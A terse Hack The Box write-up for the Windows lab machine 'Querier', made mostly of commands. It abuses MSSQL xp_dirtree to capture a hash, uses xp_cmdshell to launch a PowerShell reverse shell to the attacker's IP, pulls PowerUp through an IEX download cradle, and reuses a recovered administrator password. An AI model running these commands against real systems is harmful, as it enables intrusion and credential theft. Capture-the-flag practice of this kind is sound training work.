---
layout: single
title: Querier - Hack The Box
excerpt: "N/A"
date: 2019-06-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-querier/querier_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
  unreleased: false
categories:
  - hackthebox
tags:  
  - windows
  - medium
  - mssql
  - xp_dirtree
  - xp_cmdshell
  - powerup.ps1
  - smb
---

![](/assets/images/htb-writeup-querier/querier_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

N/A<br><br><br><br><br><br><br>

----------------

# USER

**LISTENER:**
```bash
python smbserver.py -smb2support -ip 10.10.14.3 reporting /tmp 
```

**RUN:**
```bash
python mssqlclient.py -windows-auth querier/reporting:PcwTWTHRwryjc\$c6@10.10.10.125
SQL> EXEC master.sys.xp_dirtree '\\10.10.14.3\tmp'
```

**Connect with credentials:**
```bash
python mssqlclient.py querier/mssql-svc:corporate568@10.10.10.125 -windows-auth

> xp_cmdshell type C:\Users\mssql-svc\Desktop\user.txt
```

--------
<br><br>
# ROOT


**Start `smbserver` and `netcat` listener:**
```bash
$ python smbserver.py -smb2support -ip 10.10.14.11 querier /tmp
$ nc -lnvp 4444
```

**Get reverse shell with `PowerShellTcp`:**
```bash
SQL > xp_cmdshell move \\10.10.14.11\querier\Invoke-PowerShellTcp.ps1 C:\Users\mssql-svc\Desktop\pENIS.ps1
SQL > xp_cmdshell "powershell -file c:\Users\mssql-svc\Desktop\pENIS.ps1 -Reverse -IPAddress 10.10.14.11 -Port 4444"

PS > IEX (New-Object Net.WebClient).DownloadString('\\10.10.14.11\querier\PowerUp.ps1'); Invoke-AllChecks
 [*] Checking for cached Group Policy Preferences .xml files....
 Usernames : {Administrator}
 Passwords : {MyUnclesAreMarioAndLuigi!!1!}
```

**Grab flag:**
```bash
$ python smbclient.py querier/Administrator:MyUnclesAreMarioAndLuigi\!\!1\!@10.10.10.125
$ use C$
$ cd Users/Administrator/Desktop
$ get root.txt
 ```